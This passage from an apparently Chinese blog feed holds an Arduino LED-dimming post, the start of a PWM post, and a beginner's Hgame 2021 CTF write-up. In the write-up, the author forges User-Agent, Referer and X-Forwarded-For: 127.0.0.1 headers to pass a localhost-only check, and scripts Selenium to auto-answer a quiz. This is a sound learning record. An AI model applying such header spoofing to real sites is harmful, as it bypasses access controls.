脚，产生高电位。如果没有 10kΩ 电阻，按下开关时，正电源将和接地直接相连，造成短路。</p><p>​        像上图一样，在芯片的脚位连接一个电阻再接地，则此电阻称为<strong>下拉电阻</strong></p><p>​        当然也有<strong>上拉电阻</strong>，即将电阻接到电源，像下图这样：</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210205153254.png" alt="上拉电阻接法" style="zoom:50%;" /><h1 id="设计方案"><a href="#设计方案" class="headerlink" title="设计方案"></a>设计方案</h1><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210205214735.png" alt="image-20210205214735487" style="zoom:50%;" /><h1 id="材料清单"><a href="#材料清单" class="headerlink" title="材料清单"></a>材料清单</h1><table><thead><tr><th>材料</th><th>数量</th></tr></thead><tbody><tr><td>Arduino Uno</td><td>1</td></tr><tr><td>面包板</td><td>1</td></tr><tr><td>1kΩ电阻</td><td>1</td></tr><tr><td>10kΩ电阻</td><td>2</td></tr><tr><td>LED</td><td>1</td></tr><tr><td>开关</td><td>2</td></tr><tr><td>导线</td><td>若干</td></tr></tbody></table><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LED 9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BTN1 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BTN2 3</span></span><br><span class="line"><span class="keyword">boolean</span> lastState1 = <span class="literal">LOW</span>;</span><br><span class="line"><span class="keyword">boolean</span> lastState2 = <span class="literal">LOW</span>;</span><br><span class="line"><span class="keyword">byte</span> click1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">byte</span> click2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ledV = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">pinMode</span>(LED, <span class="literal">OUTPUT</span>);</span><br><span class="line">    <span class="built_in">pinMode</span>(BTN1, <span class="literal">INPUT</span>);</span><br><span class="line">    <span class="built_in">pinMode</span>(BTN2, <span class="literal">INPUT</span>);</span><br><span class="line">    lastState1 = <span class="built_in">digitalRead</span>(BTN1);</span><br><span class="line">    lastState2 = <span class="built_in">digitalRead</span>(BTN2);</span><br><span class="line">    <span class="built_in">analogWrite</span>(LED, <span class="number">255</span>);</span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">analogWrite</span>(LED, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">analogWrite</span>(LED, <span class="number">255</span>);</span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">analogWrite</span>(LED, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> a1 = <span class="built_in">digitalRead</span>(BTN1);</span><br><span class="line">    <span class="keyword">boolean</span> b1 = <span class="built_in">digitalRead</span>(BTN2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (a1 != lastState1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">        <span class="keyword">boolean</span> a2 = <span class="built_in">digitalRead</span>(BTN1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a1 == a2)</span><br><span class="line">        &#123;</span><br><span class="line">            lastState1 = a1;</span><br><span class="line">            click1++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (b1 != lastState2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">        <span class="keyword">boolean</span> b2 = <span class="built_in">digitalRead</span>(BTN2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (b1 == b2)</span><br><span class="line">        &#123;</span><br><span class="line">            lastState2 = b1;</span><br><span class="line">            click2++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (click1 == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        click1 = <span class="number">0</span>;</span><br><span class="line">        click2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ledV == <span class="number">255</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">analogWrite</span>(LED, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">            <span class="built_in">analogWrite</span>(LED, <span class="number">255</span>);</span><br><span class="line">            <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">            <span class="built_in">analogWrite</span>(LED, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">            <span class="built_in">analogWrite</span>(LED, <span class="number">255</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ledV += <span class="number">30</span>;</span><br><span class="line">            <span class="keyword">if</span> (ledV &gt;= <span class="number">255</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ledV = <span class="number">255</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">analogWrite</span>(LED, ledV);</span><br><span class="line">            <span class="keyword">if</span> (ledV == <span class="number">255</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">analogWrite</span>(LED, <span class="number">0</span>);</span><br><span class="line">                <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">                <span class="built_in">analogWrite</span>(LED, <span class="number">255</span>);</span><br><span class="line">                <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">                <span class="built_in">analogWrite</span>(LED, <span class="number">0</span>);</span><br><span class="line">                <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">                <span class="built_in">analogWrite</span>(LED, <span class="number">255</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (click2 == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        click1 = <span class="number">0</span>;</span><br><span class="line">        click2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ledV == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">analogWrite</span>(LED, <span class="number">255</span>);</span><br><span class="line">            <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">            <span class="built_in">analogWrite</span>(LED, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">            <span class="built_in">analogWrite</span>(LED, <span class="number">255</span>);</span><br><span class="line">            <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">            <span class="built_in">analogWrite</span>(LED, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ledV -= <span class="number">30</span>;</span><br><span class="line">            <span class="keyword">if</span> (ledV &lt;= <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ledV = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">analogWrite</span>(LED, ledV);</span><br><span class="line">            <span class="keyword">if</span> (ledV == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">analogWrite</span>(LED, <span class="number">255</span>);</span><br><span class="line">                <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">                <span class="built_in">analogWrite</span>(LED, <span class="number">0</span>);</span><br><span class="line">                <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">                <span class="built_in">analogWrite</span>(LED, <span class="number">255</span>);</span><br><span class="line">                <span class="built_in">delay</span>(<span class="number">50</span>);</span><br><span class="line">                <span class="built_in">analogWrite</span>(LED, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="成果展示"><a href="#成果展示" class="headerlink" title="成果展示"></a>成果展示</h1><p><video controls name="media" style="zoom:60%;"><source src="https://videos-wujunyi.oss-cn-beijing.aliyuncs.com/VID_20210205_171713.mp4" type="video/mp4"></video></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;任务内容：&lt;br&gt;两个按键A、B，A 按下小灯变亮一点，B 按下小灯变暗一点。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="单片机" scheme="https://wujunyi792.github.io/categories/%E5%8D%95%E7%89%87%E6%9C%BA/"/>
    
    <category term="arduino" scheme="https://wujunyi792.github.io/categories/%E5%8D%95%E7%89%87%E6%9C%BA/arduino/"/>
    
    
    <category term="arduino" scheme="https://wujunyi792.github.io/tags/arduino/"/>
    
  </entry>
  
  <entry>
    <title>Hgame week1 Writeup</title>
    <link href="https://wujunyi792.github.io/2021/02/04/Hgame%20week1%20Writeup/"/>
    <id>https://wujunyi792.github.io/2021/02/04/Hgame%20week1%20Writeup/</id>
    <published>2021-02-04T06:36:42.000Z</published>
    <updated>2021-02-13T17:43:54.714Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>第一次参加CTF，小白视角参赛体验，从零开始学CTF</p></blockquote><p>[TOC]</p><a id="more"></a><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="第一题Hitchhiking-in-the-Galaxy"><a href="#第一题Hitchhiking-in-the-Galaxy" class="headerlink" title="第一题Hitchhiking_in_the_Galaxy"></a>第一题Hitchhiking_in_the_Galaxy</h2><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210204144952.png" alt="Hitchhiking_in_the_Galaxy题目" style="zoom:50%;" /><p>这一题其实我看了蛮久的，好几题那没看出啥来，不过后来想到这题只有100分，那应该不是很难。果然是自己想太多！</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>打开网页 <a href="http://hitchhiker42.0727.site:42420/">http://hitchhiker42.0727.site:42420/</a> ，看到如下页面</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210204153227.png" alt="image-20210204145549458" style="zoom:50%;" /><p>直接一个404，没啥信息，于是 F12 打开控制台看看有没有什么线索。header 里没看见什么奇怪的信息，只有页面源代码给出了一个 link 连接<code>HitchhikerGuide.php</code></p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210204145947.png" alt="Hitchhiking_in_the_Galaxy_2" style="zoom:70%;" /><p>那就去看看那里有啥。</p><p>直接访问 <a href="http://hitchhiker42.0727.site:42420/HitchhikerGuide.php">http://hitchhiker42.0727.site:42420/HitchhikerGuide.php</a></p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210204153031.png" alt="image-20210204153031797" style="zoom:33%;" /><p>好家伙又来到404页面，但是注意到这次来到的是<code>index.php</code>。打开控制台，发现是302转向到了<code>index.php</code>页面。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210204150658.png" alt="image-20210204150658429" style="zoom:35%;" /><p>大胆猜测 maybe 访问方式不对，那把 GET 方式换成 POST方式试试。打开 Hackbar 插件，启用 POST请求，发送！有信息了！</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210204150958.png" alt="image-20210204150958650" style="zoom:35%;" /><p>使用<code>Infinite Improbability Drive</code>方式？可能再说 User-Agent ？那 header 里加上 User-Agent 看看。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210204151446.png" alt="image-20210204151446650" style="zoom:35%;" /><p>好家伙，成功了。不过又说要从 <a href="https://cardinal.ink/">Cardinal</a> 过来，那么很 easy，header 里再加上 <code>Referer</code>参数。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210204151717.png" alt="image-20210204151717026" style="zoom:35%;" /><p>没毛病，成功了。又说要本地访问，那就在 header 里加个<code>X-Forwarded-For</code>参数，值为<code>127.0.0.1</code>。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210204151919.png" alt="image-20210204151919486" style="zoom:35%;" /><p>GET！<code>hgame&#123;s3Cret_0f_HitCHhiking_in_the_GAl@xy_i5_dOnT_p@nic!&#125;</code></p><hr><h2 id="第二题-Watermelon"><a href="#第二题-Watermelon" class="headerlink" title="第二题 Watermelon"></a>第二题 Watermelon</h2><p>简单上头的小游戏——真的上头，完了好久好久！</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210204165438.png" alt="image-20210204165438863" style="zoom:40%;" /><p>不难发现，得到了 2000 分才能拿到 flag。</p><p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210204165959.png" alt="image-20210204165959619" style="zoom:50%;" /><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210204170246.png" style="zoom:62%;" /></p><p>也许能通过操作 js 来获得 flag。</p><p>通过审计页面源代码，很快定位到了一个叫<code>project.js</code>的文件，里面的变量 e 应该就是分数。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210204170905.png" alt="image-20210204170830357" style="zoom:50%;" /><p>发现里面有这样一段代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gameOverShowText: <span class="function"><span class="keyword">function</span> (<span class="params">e, t</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(e &gt; <span class="number">1999</span>)&#123;</span><br><span class="line">alert(<span class="built_in">window</span>.atob(<span class="string">&quot;aGdhbWV7ZG9feW91X2tub3dfY29jb3NfZ2FtZT99&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><code>atob()</code> 方法用于解码使用 base-64 编码的字符串，那么<code>aGdhbWV7ZG9feW91X2tub3dfY29jb3NfZ2FtZT99</code>应该就是 base-64 编码的字符串。解码一下</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210204171335.png" alt="解码" style="zoom:50%;" /><p>GET！<code>hgame&#123;do_you_know_cocos_game?&#125;</code></p><hr><h2 id="第三题-宝藏走私者"><a href="#第三题-宝藏走私者" class="headerlink" title="第三题 宝藏走私者"></a>第三题 宝藏走私者</h2><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210205002221.png" alt="image-20210205002220955" style="zoom:50%;" /><p>这应该是一道关于HTTP走私的题目，目前知识学明白了，但操作上不知道哪出了问题一直没成功。</p><p>BUT！我好像<strong>多次</strong>搭上了顺风车</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210205002437.png" alt="image-20210205002437221" style="zoom:40%;" /><p>flag如上图，具体搞明白了再补充吧。</p><hr><h2 id="第四题-智商检测鸡"><a href="#第四题-智商检测鸡" class="headerlink" title="第四题 智商检测鸡"></a>第四题 智商检测鸡</h2><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210205002822.png" alt="image-20210205002822480" style="zoom:50%;" /><p>​        100道定积分计算，做完给flag。服务器通过临时session来识别用户，因此手算必然不可能。那么试试自动计算？</p><p>​        瞬间想到Python，打算试试 selenium 自动化。但是对于分析了页面源码后，我发现以我现有水平读取积分上下限的值和程式有难度（负号在单独的标签里）。所以打算先收算几道看看有没有啥规律。</p><p>​        然后在<strong>微软数学</strong>手机软件的帮助下，做了十几道题，发现规律——<strong>积分下限都是负整数，上限都是正整数，积分式子都是 <code>Ax+B</code>的形式，其中 A 和 B 都为正整数</strong></p><p>那就很 ez 了，编写Python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep//导入sleep包来使用sleep函数</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver//导入webdriver自动化组件</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *//sympy里的integrate函数用于定积分计算</span><br><span class="line"></span><br><span class="line">wd = webdriver.Chrome(<span class="string">r&#x27;chromedriver.exe&#x27;</span>)//定位chrome浏览器自动化的驱动程序（因为我使用chrome）</span><br><span class="line">wd.get(<span class="string">&#x27;http://r4u.top:5000/&#x27;</span>)//打开网页窗口，自动访问该网页</span><br><span class="line">sleep(<span class="number">1</span>)//我怕网页没加载好就开始寻找元素，那必报错，所以让程序sleep一会</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)://<span class="number">100</span>道题，循环<span class="number">100</span>次</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        inPutBox = wd.find_element_by_id(<span class="string">&#x27;answer&#x27;</span>)//定位答案输入框</span><br><span class="line">        clickBtn = wd.find_element_by_css_selector(<span class="string">&#x27;.btn.btn-primary&#x27;</span>)//定位验证答案框</span><br><span class="line">        a = <span class="string">&quot;-&quot;</span> + wd.find_element_by_css_selector(<span class="string">&#x27;#integral &gt; math &gt; mrow &gt; msubsup &gt; mrow:nth-child(2) &gt; mn&#x27;</span>).text//积分下限</span><br><span class="line">        b = wd.find_element_by_css_selector(<span class="string">&#x27;#integral &gt; math &gt; mrow &gt; msubsup &gt; mrow:nth-child(3) &gt; mn&#x27;</span>).text//积分上限</span><br><span class="line">        c = wd.find_element_by_css_selector(<span class="string">&#x27;#integral &gt; math &gt; mrow &gt; mn:nth-child(3)&#x27;</span>).text//积分式 Ax+B 中的 A</span><br><span class="line">        d = wd.find_element_by_css_selector(<span class="string">&#x27;#integral &gt; math &gt; mrow &gt; mn:nth-child(6)&#x27;</span>).text//积分式 Ax+B 中的 B</span><br><span class="line">        a = <span class="built_in">int</span>(a)//字符串转数字</span><br><span class="line">        b = <span class="built_in">int</span>(b)//字符串转数字</span><br><span class="line">        c = <span class="built_in">int</span>(c)//字符串转数字</span><br><span class="line">        d = <span class="built_in">int</span>(d)//字符串转数字</span><br><span class="line">        x = symbols(<span class="string">&#x27;x&#x27;</span>)//x为积分变量</span><br><span class="line">        result = <span class="built_in">str</span>(integrate(c * x + d, (x, a, b)))//计算答案，同时转换为字符串格式</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> result://这里很重要，定积分计算结果不是用小数表示的，比如 <span class="number">1.5</span> 是用 <span class="number">3</span>/<span class="number">2</span> 表示的，所以要处理一下</span><br><span class="line">            eq = result.split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">            result = <span class="built_in">float</span>(eq[<span class="number">0</span>]) / <span class="built_in">float</span>(eq[<span class="number">1</span>])</span><br><span class="line">            result = <span class="built_in">str</span>(result)//用split函数把分子分母取出来，转换成浮点数除一下，就得到小数了，最后转换成字符串</span><br><span class="line">        inPutBox.send_keys(result)//向输输入框中输入答案</span><br><span class="line">        clickBtn.click()//自动点击验证答案切换到下一题</span><br><span class="line">    <span class="keyword">finally</span>://没学过python的，本来想试一下<span class="keyword">try</span>，然后就出现了没啥用的<span class="keyword">try</span>-<span class="keyword">finally</span>结构</span><br><span class="line">        sleep(<span class="number">1</span>)//等下一题加载出来</span><br><span class="line">        inPutBox.clear()//清空输入框</span><br></pre></td></tr></table></figure><p><code>Ctrl</code>+<code>Shift</code>+<code>F10</code>，稍等片刻：</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210205011507.png" alt="image-20210205011507090" style="zoom:50%;" /><p>得到Flag <code>hgame&#123;3very0ne_H4tes_Math&#125;</code></p><hr><h2 id="第五题-走私者的愤怒"><a href="#第五题-走私者的愤怒" class="headerlink" title="第五题 走私者的愤怒"></a>第五题 走私者的愤怒</h2><p>我还没整明白</p><hr><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="第一题-Base全家福"><a href="#第一题-Base全家福" class="headerlink" title="第一题 Base全家福"></a>第一题 Base全家福</h2><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210205011852.png" alt="image-20210205011852749" style="zoom:50%;" /><p>这题蛮easy的，都说了 Base全家福 那应该就是 Base混合编码的解码，直接用 python 解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;base.txt&#x27;</span>)</span><br><span class="line">content = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">    content = content + i.replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        content = base64.b64decode(content).decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = base64.b32decode(content).decode()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                content = base64.b16decode(content).decode()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="string">&#x27;result: &#x27;</span>, content)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>运行！</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210205012159.png" alt="image-20210205012159739" style="zoom:30%;" /><p>得到Flag <code>result:  hgame&#123;We1c0me_t0_HG4M3_2021&#125;</code>  啊哈原来是签到题</p><p>参考文章:  </p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For">X-Forwarded-For 伪造Localhost</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;第一次参加CTF，小白视角参赛体验，从零开始学CTF&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;[TOC]&lt;/p&gt;</summary>
    
    
    
    <category term="Hgame" scheme="https://wujunyi792.github.io/categories/Hgame/"/>
    
    
    <category term="Hgame" scheme="https://wujunyi792.github.io/tags/Hgame/"/>
    
    <category term="writeup" scheme="https://wujunyi792.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>PWN流水灯</title>
    <link href="https://wujunyi792.github.io/2021/02/01/PWN%E6%B5%81%E6%B0%B4%E7%81%AF/"/>
    <id>https://wujunyi792.github.io/2021/02/01/PWN%E6%B5%81%E6%B0%B4%E7%81%AF/</id>
    <published>2021-02-01T07:00:32.000Z</published>
    <updated>2021-02-01T10:51:45.893Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>设有三个小灯A、B、C 事先处于熄灭状态，接着A 灯开始由暗到亮，再由亮变暗，A 灯熄灭之后B 灯开始由暗变亮，再由亮变暗，B 灯熄灭之后C 灯开始由暗变亮，再由亮变暗，如此循环。</p></blockquote><a id="more"></a><h1 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h1><h2 id="nbsp-nbsp-nbsp-PWM变频技术"><a href="#nbsp-nbsp-nbsp-PWM变频技术" class="headerlink" title="&nbsp;&nbsp;&nbsp;PWM变频技术"></a>&nbsp;&nbsp;&nbsp;PWM变频技术</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数字信号只有高、低电位两种状态，如同第一章的LED闪烁程序，把一只LED接上Arduino的第13引脚，每隔0.5s切换高低电位，LED将不停闪烁。这是一种以一秒钟为周期的切换信号，频率就是1Hz。<strong>提高切换频率（通常指30Hz以上），将能仿真模拟电压高低变化的效果</strong>。以下图的1kHz为例，若脉冲宽度（开启时间）为周期的一半（称为50%工作周期），就相当于输出高电位的一半电压；10%工作周期，就相当于输出0.5V。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210201151545.png" alt="image-20210201151545002" style="zoom:70%;" /><p>如此，不需采用电阻降低电压，电能不会在变换的过程被损耗掉。这种在数字系统上“仿真”模拟输出的方式，称为<strong>脉冲宽度调制</strong>（Pulse Width Modulation，简称PWM）。某些强调省电的变频式洗衣机和冷气机等家电，也是运用PWM原理来调节机器的运转速度。</p><p>PWM的计算方式如下。</p><p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210201152002.png" alt="image-20210201152002139"></p><p>因此，在5V电源的情况下输出3.3V，从上面的式子可知：</p><p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210201152106.png" alt="image-20210201152106610"></p><p>根据计算结果得知，5V电源的66%PWM脉冲宽度就相当于输出3.3V。</p><h2 id="nbsp-nbsp-nbsp-PWM指令和默认频率"><a href="#nbsp-nbsp-nbsp-PWM指令和默认频率" class="headerlink" 